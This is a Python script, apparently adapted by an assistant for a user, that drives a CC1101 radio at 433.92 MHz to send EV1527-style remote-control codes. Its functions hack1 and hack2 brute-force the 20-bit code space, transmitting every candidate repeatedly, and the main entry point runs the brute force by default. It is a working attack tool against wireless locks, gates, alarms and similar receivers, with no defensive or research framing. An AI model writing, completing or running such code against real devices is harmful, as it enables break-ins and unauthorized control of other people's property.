import cc1101
import logging
import time

# 原始版本的编码函数（你的版本）
def getTxData(data, bit_rate=10000, isdebug=False):
    BIT_RATE = bit_rate
    BIT_DURATION_US = 1_000_000 / BIT_RATE

    HIGH_0_BITS = int(400 / BIT_DURATION_US)
    LOW_0_BITS = int(1200 / BIT_DURATION_US)
    HIGH_1_BITS = int(1200 / BIT_DURATION_US)
    LOW_1_BITS = int(400 / BIT_DURATION_US)

    bit_stream = []
    for byte in data:
        for bit_pos in range(7, -1, -1):
            bit = (byte >> bit_pos) & 0x01
            if bit == 0:
                bit_stream += [1] * HIGH_0_BITS + [0] * LOW_0_BITS
            else:
                bit_stream += [1] * HIGH_1_BITS + [0] * LOW_1_BITS

    bit_stream += [1] * HIGH_0_BITS + [0] * LOW_0_BITS
    while len(bit_stream) % 8 != 0:
        bit_stream.append(0)
    bit_stream += [0] * 8

    tx_bytes = bytearray()
    for i in range(0, len(bit_stream), 8):
        byte = 0
        bits = bit_stream[i:i+8]
        for bit in bits:
            byte = (byte << 1) | bit
        tx_bytes.append(byte)

    return tx_bytes

# 新版本的编码函数（仿照你给的C语言代码）
def to_code(c):
    mapping = {0: 0x88, 1: 0x8E, 2: 0xE8, 3: 0xEE}
    return mapping[c]

def hex2code1527(hex_str):
    buf1527 = bytearray()
    # buf1527 += bytes([0x80, 0x00, 0x00, 0x00])  # 起始标记
    for char in hex_str:
        d = int(char, 16)
        buf1527.append(to_code((d & 0xC) >> 2))
        buf1527.append(to_code(d & 0x3))
    buf1527.append(0x80)  # 结束标记
    return buf1527

def wait_for_idle(transceiver, timeout=2.0):
    start_time = time.time()
    while True:
        state = transceiver.get_main_radio_control_state_machine_state()
        if state == cc1101.MainRadioControlStateMachineState.IDLE:
            return
        if time.time() - start_time > timeout:
            raise TimeoutError("等待芯片状态变为IDLE超时")
        time.sleep(0.01)

def init_transceiver(frequency=433.92e6, symbol_rate=10122, power=(0, 0xC0)):
    transceiver = cc1101.CC1101()
    transceiver.__enter__()
    transceiver.set_base_frequency_hertz(frequency)
    transceiver.set_symbol_rate_baud(symbol_rate)
    transceiver.set_sync_mode(cc1101.SyncMode.NO_PREAMBLE_AND_SYNC_WORD)
    transceiver.set_packet_length_mode(cc1101.PacketLengthMode.FIXED)
    transceiver.disable_checksum()
    transceiver.set_output_power(power)
    logging.info(f"Transceiver initialized:\n{transceiver}")
    return transceiver

def send_data(transceiver, tx_bytes, max_retries=3, retry_interval=0.1):
    for attempt in range(1, max_retries + 1):
        try:
            wait_for_idle(transceiver)
            transceiver.set_packet_length_bytes(len(tx_bytes))
            transceiver.transmit(tx_bytes)
            return
        except Exception as e:
            logging.warning(f"发送失败，第{attempt}次尝试，错误信息: {e}")
            if attempt < max_retries:
                time.sleep(retry_interval)
            else:
                logging.error("重试3次失败，关闭transceiver。")
                close_transceiver(transceiver)
                raise e

def close_transceiver(transceiver):
    transceiver.__exit__(None, None, None)
    logging.info("Transceiver closed.")

# 原版本test和hack（现在叫test1和hack1）
def test1(transceiver):
    hex_string = '4bb108'
    data = bytes.fromhex(hex_string)
    tx_data = getTxData(data)
    for _ in range(3):
        send_data(transceiver, tx_data)

def hack1(transceiver):
    start = 0x00000
    end = 0x40000
    for i in range(start, end):
        hex_string = f"{i:05x}" + "1"
        if hex_string == '4bb101':
            continue
        data = bytes.fromhex(hex_string)
        tx_data = getTxData(data)
        print(f"Sending: {hex_string}")
        for _ in range(2):
            send_data(transceiver, tx_data)

# 新版本test和hack（test2和hack2）
def test2(transceiver):
    hex_string = '4bb108'
    tx_data = hex2code1527(hex_string)
    for _ in range(2):
        send_data(transceiver, tx_data)

def hack2(transceiver):
    # start = 0x00000
    # end = 0x40000

    start = 0x40000
    end = 0x50000  # 假设新版本的范围更大

    for i in range(start, end):
        hex_string = f"{i:05x}" + "1"
        if hex_string == '4bb101':
            continue
        tx_data = hex2code1527(hex_string)
        print(f"Sending: {hex_string}")
        for _ in range(3):
            send_data(transceiver, tx_data)

# 主程序封装
def main1():
    logging.basicConfig(level=logging.INFO)
    logging.getLogger("cc1101").setLevel(logging.WARNING)
    transceiver = init_transceiver(frequency=433.92e6, symbol_rate=10122, power=(0, 0xC0))
    try:
        test1(transceiver)
        # hack1(transceiver)
    finally:
        close_transceiver(transceiver)

def main2():
    logging.basicConfig(level=logging.INFO)
    logging.getLogger("cc1101").setLevel(logging.WARNING)
    transceiver = init_transceiver(frequency=433.92e6, symbol_rate=2700, power=(0, 0xC0))  # 假设新版本更低的symbol_rate
    try:
        # test2(transceiver)
        hack2(transceiver)
    finally:
        close_transceiver(transceiver)

if __name__ == "__main__":
    # 你可以选择调用main1或main2
    # main1()  # 旧版本
    main2()    # 新版本
